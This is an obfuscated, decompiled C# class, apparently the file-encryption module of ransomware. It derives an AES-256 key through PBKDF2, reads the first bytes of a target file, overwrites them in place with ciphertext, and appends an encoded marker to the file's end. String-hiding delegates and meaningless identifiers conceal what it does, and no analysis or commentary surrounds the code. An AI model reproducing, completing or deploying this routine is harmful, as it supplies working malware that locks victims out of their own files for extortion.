using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public static class RgELsEgHUCW
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] eUGEbOMOKENsBL(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = BRGWwdoEbO(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes BRGWwdoEbO(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] yawJYYjGarh(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (GRQFeQGQfBG.POXokwFKrkkHxdVH == getString_0(107396943))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (GRQFeQGQfBG.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(GRQFeQGQfBG.jnRLNtXuRRg, getString_0(107385691) + string_0 + getString_0(107400286) + ex.Message + getString_0(107396344));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool UWMgjLGhgbOURXn(string VBvOCDljtLw, byte[] kSmujIomiIqp, byte[] dJYcPbfWMdc = null)
	{
		try
		{
			byte[] array = null;
			if (GRQFeQGQfBG.POXokwFKrkkHxdVH == getString_0(107396943))
			{
				array = (GRQFeQGQfBG.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228))) : Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(VBvOCDljtLw, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(kSmujIomiIqp, 0, kSmujIomiIqp.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(VBvOCDljtLw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GRQFeQGQfBG.IooTTsvIiwCN)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(dJYcPbfWMdc, 0, dJYcPbfWMdc.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (GRQFeQGQfBG.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228))) : Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269))));
				FileStream fileStream2 = new FileStream(VBvOCDljtLw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(kSmujIomiIqp, 0, kSmujIomiIqp.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(VBvOCDljtLw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GRQFeQGQfBG.IooTTsvIiwCN)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(dJYcPbfWMdc, 0, dJYcPbfWMdc.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			GRQFeQGQfBG.XnicJWCgBOO++;
		}
		catch (Exception ex)
		{
			if (GRQFeQGQfBG.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(GRQFeQGQfBG.jnRLNtXuRRg, getString_0(107385691) + VBvOCDljtLw + getString_0(107400251) + ex.Message + getString_0(107396344));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (GRQFeQGQfBG.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400228))) : Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(GRQFeQGQfBG.aEpEnRRNDPnpp) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269)) + Convert.ToString(GRQFeQGQfBG.xYkYbBCyjIxz) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400269))));
				FileStream fileStream4 = new FileStream(VBvOCDljtLw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(kSmujIomiIqp, 0, kSmujIomiIqp.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(VBvOCDljtLw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!GRQFeQGQfBG.IooTTsvIiwCN)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(dJYcPbfWMdc, 0, dJYcPbfWMdc.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static RgELsEgHUCW()
	{
		Strings.CreateGetStringDelegate(typeof(RgELsEgHUCW));
	}
}
